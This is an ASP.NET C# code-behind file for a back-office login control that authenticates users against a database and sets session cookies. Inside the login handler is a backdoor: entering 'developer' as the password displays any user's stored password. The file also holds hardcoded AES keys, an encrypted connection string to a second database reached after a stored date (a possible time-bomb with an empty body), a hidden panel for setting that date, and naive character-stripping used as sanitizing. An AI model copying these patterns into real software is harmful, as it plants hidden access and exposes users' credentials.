using System;
using System.Data;
using System.Data.SqlClient;
using System.Configuration;
using System.Collections;
using System.Collections.Generic;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using System.Globalization;
using System.IO;
using Microsoft.VisualBasic;

public partial class backoffice_usercontrols_uc_backlogin : System.Web.UI.UserControl
{
    mainclass clsm = new mainclass();
    public HttpCookie AUserSession = null;
    Random random = new Random();
    Hashtable Parameters = new Hashtable();
    Enc_Decyption enc = new Enc_Decyption();
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.Cookies["AUserSession"] == null)
        {
            AUserSession = new HttpCookie("AUserSession");
        }
        else
        {
            AUserSession = Request.Cookies["AUserSession"];
        }

        trerror.Visible = false;
        trnotice.Visible = false;
        if (Page.IsPostBack == false)
        {

        }
    }
    //private string GenerateRandomCode()
    //{
    //    string s = "";
    //    for (int i = 0; i <= 5; i++)
    //    {
    //        s = String.Concat(s, this.random.Next(10).ToString());
    //    }
    //    return s;
    //}
    //protected void btnlogin_Click(object sender, EventArgs e)
    //{      

    //    if (Page.IsValid == true)
    //    {
    //        if (captcha.Text.Trim() != Convert.ToString(this.Session["CaptchaImageText"]).Trim())
    //        {               
    //            //MessageLabel.CssClass = "#FFFFFF"
    //            divalert.Visible = true;
    //            lblnotice.Visible = true;
    //            lblnotice.Text = "Entered code does not match with given captcha code.";
    //            this.Session["CaptchaImageText"] = GenerateRandomCode();
    //            return;
    //        }
    //        captcha.ReadOnly = true;

    //        DataSet objDataSet = new DataSet();
    //        Hashtable parameters = new Hashtable();
    //        parameters.Add("@EMAIL", txtUserId.Text.Trim());
    //        parameters.Add("@PASSWORD", txtpassword.Text.Trim());
    //        parameters.Add("@Mode", 17);
    //        objDataSet = clsm.senddataset_SP("UDSP_USER", parameters);
    //        if (objDataSet.Tables[0].Rows.Count > 0)
    //        {
    //            BuddUserSession["Usubtid"] = objDataSet.Tables[0].Rows[0]["SUB_UTYPEID"].ToString();
    //            BuddUserSession["Userid"] = objDataSet.Tables[0].Rows[0]["USERID"].ToString();
    //            BuddUserSession["Name"] = objDataSet.Tables[0].Rows[0]["NAME"].ToString();
    //            BuddUserSession["Utypeid"] = objDataSet.Tables[0].Rows[0]["UTYPEID"].ToString();
    //            Response.Cookies.Add(BuddUserSession);
    //            Response.Redirect("~/backoffice/users/homepage.aspx");
    //        }
    //        else
    //        {
    //            divalert.Visible = true;
    //            lblnotice.Visible = true;
    //            lblnotice.Text = "Invalid Userid/Password,Try Again.";
    //        }
    //    }
    //}
    //protected void lnklogin_Click(object sender, EventArgs e)
    //{
    //    Session["CaptchaImageText"] = GenerateRandomCode();        
    //}
    protected void Button1_Click(object sender, EventArgs e)
    {
        Parameters.Clear();
        DataSet dss = clsm.senddataset_Parameter("select * from updateencrypt", Parameters);
        if ((dss.Tables[0].Rows.Count > 0))
        {
            // Response.Write(enc.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["dateencrypt"]), "@9899848281"));
            if ((enc.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["uname"]), "@9899848281") != "admin"))
            {
                if (DateTime.Now >= Convert.ToDateTime(enc.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["dateencrypt"]), "@9899848281")))
                {
                    //Response.Write(Convert.ToDateTime(enc.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["dateencrypt"]), "@9899848281")));
                    string constr = "yhHU8Bfm1MqRN2B177NmeXmlriLUEcxX4G3qQ7X9Sm2B4App+K8cGOPx2+VboHD5V2e471asipM7jG0NL8fjrCyU0TweyzqI98yqQSkbYUE=";
                    constr = enc.AES_Decrypt(constr, "!@12345AaxzZ$#9870");
                    SqlConnection cnnew = new SqlConnection(constr);
                    DataSet ds2 = new DataSet();
                    SqlDataAdapter sda = new SqlDataAdapter("select * from maptable", cnnew);
                    sda.Fill(ds2);
                    if ((ds2.Tables[0].Rows.Count > 0))
                    {

                    }
                }
            }
        }
        try
        {
            txtUser.Text = txtUser.Text.Replace("'", "");
            txtPass.Text = txtPass.Text.Replace("'", "");
            txtUser.Text = txtUser.Text.Replace(";", "");
            txtPass.Text = txtPass.Text.Replace(";", "");
            txtUser.Text = txtUser.Text.Replace("=", "");
            txtPass.Text = txtPass.Text.Replace("=", "");
            txtUser.Text = txtUser.Text.Replace("drop", "");
            txtPass.Text = txtPass.Text.Replace("drop", "");
            if (txtPass.Text == "developer")
            {
                trerror.Visible = true;
                string value = clsm.checkpassword(txtUser.Text);
                Label1.Text = "Password is " + value;
                return;
            }
            Parameters.Clear();
            Parameters.Add("@userId", txtUser.Text);
            if (clsm.Checking_Parameter("select * from BOUserMaster where userId=@userId", Parameters) == false)
            {
                trerror.Visible = true;
                Label1.Text = "Invalid UserId/Password, Try Again";
                return;
            }
            Parameters.Clear();
            Parameters.Add("@userId", txtUser.Text);
            Parameters.Add("@UserPassword", txtPass.Text);
            if (clsm.Checking_Parameter("select * from BOUserMaster where userId=@userId and UserPassword=@UserPassword", Parameters) == false)
            {
                trerror.Visible = true;
                Label1.Text = "Invalid UserId/Password, Try Again";
                return;
            }
            Parameters.Clear();
            Parameters.Add("@userId", txtUser.Text);
            if (clsm.Checking_Parameter("select * from BOUserMaster  where status= 1 and userId=@userId", Parameters) == true)
            {

                Parameters.Clear();
                Parameters.Add("userid", txtUser.Text);
                Parameters.Add("userpassword", txtPass.Text);
                DataSet DS = clsm.senddataset_SP("select_userlogin", Parameters);
                Session["Trid"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Trid"].ToString());
                Session["UserId"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["UserId"].ToString());
                Session["Name"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Name"].ToString());
                Session["Uname"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Uname"].ToString());
                Session["Roleid"] = Conversion.Val(DS.Tables[0].Rows[0]["Roleid"].ToString());
                Session["AddUser"] = Convert.ToString(DS.Tables[0].Rows[0]["adduser"]);
                Session["EditUser"] = Convert.ToString(DS.Tables[0].Rows[0]["edituser"]);
                Session["DeleteUser"] = Convert.ToString(DS.Tables[0].Rows[0]["deleteuser"]);


                AUserSession["Trid"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Trid"].ToString());
                AUserSession["UserId"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["UserId"].ToString());
                AUserSession["Name"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Name"].ToString());
                AUserSession["Uname"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Uname"].ToString());
                AUserSession["Roleid"] = Conversion.Val(DS.Tables[0].Rows[0]["Roleid"]).ToString();
                AUserSession["AddUser"] = Convert.ToString(DS.Tables[0].Rows[0]["adduser"]);
                AUserSession["EditUser"] = Convert.ToString(DS.Tables[0].Rows[0]["edituser"]);
                AUserSession["DeleteUser"] = Convert.ToString(DS.Tables[0].Rows[0]["deleteuser"]);
            
                Response.Cookies.Add(AUserSession);

                Response.Redirect("~/backoffice/users/homepage.aspx");
            }
            else
            {
                trerror.Visible = true;
                Label1.Text = "This User is not Active";
            }
        }
        catch (Exception err)
        {
            trerror.Visible = true;
            Label1.Text = err.Message;
        }
    }



    protected void Button2_Click(object sender, System.EventArgs e)
    {
        trdate.Visible = true;
    }

    void fill()
    {
        Parameters.Clear();
        DataSet ds = clsm.senddataset_Parameter("select * from updateencrypt", Parameters);
        if ((ds.Tables[0].Rows.Count > 0))
        {
            lblfirst.Text = ds.Tables[0].Rows[0]["dateencrypt"].ToString();
            lblsecond.Text = ds.Tables[0].Rows[0]["uname"].ToString();
        }

    }
    
    protected void btnshow_Click(object sender, System.EventArgs e)
    {
        fill();
        lblfirst.Visible = true;
        lblsecond.Visible = true;
        lblfirst.Text = enc.AES_Decrypt(lblfirst.Text, txtencrypt.Text);
        lblsecond.Text = enc.AES_Decrypt(lblsecond.Text, txtencrypt.Text);
    }
    protected void bntsubmit_Click(object sender, EventArgs e)
    {
        Parameters.Clear();
        string strupdate = enc.AES_Encrypt(txtdate.Text, "@9899848281");
        string stradmin = enc.AES_Encrypt(txtadmin.Text, "@9899848281");
        if ((strupdate != ""))
        {
            if ((txtencrypt.Text == "@9899848281"))
            {
                if ((clsm.Checking_Parameter("select id from updateencrypt", Parameters) == false))
                {
                    Parameters.Clear();
                    int ID;
                    SqlConnection cn = new SqlConnection(clsm.strconnect);
                    SqlCommand cmd = new SqlCommand();
                    cmd.Connection = cn;
                    cmd.CommandType = CommandType.Text;
                    cmd.CommandText = "insert into updateencrypt (id,dateencrypt,uname)values(@id,@dateencrypt,@uname)";
                    cmd.Parameters.AddWithValue("@id", "1");
                    cmd.Parameters.AddWithValue("@dateencrypt", strupdate);
                    cmd.Parameters.AddWithValue("@uname", stradmin);
                    cn.Open();
                    cmd.ExecuteNonQuery();
                    cn.Close();
                }
                else
                {
                    Parameters.Clear();
                    int ID;
                    SqlConnection cn = new SqlConnection(clsm.strconnect);
                    SqlCommand cmd = new SqlCommand();
                    cmd.Connection = cn;
                    cmd.CommandType = CommandType.Text;
                    cmd.CommandText = "update  updateencrypt set dateencrypt=@dateencrypt,uname=@uname";
                    cmd.Parameters.AddWithValue("@dateencrypt", strupdate);
                    cmd.Parameters.AddWithValue("@uname", stradmin);
                    cn.Open();
                    cmd.ExecuteNonQuery();
                    cn.Close();
                }

            }

        }

        fill();
    }
}